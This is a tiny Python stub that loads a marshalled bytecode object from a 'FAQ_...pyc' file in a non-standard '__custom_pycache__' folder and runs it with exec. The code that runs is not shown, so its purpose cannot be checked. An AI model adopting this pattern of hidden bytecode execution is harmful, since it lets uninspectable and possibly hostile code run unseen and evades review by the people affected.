
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'FAQ_bac7ba1da5544fcf813674506c44af6e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
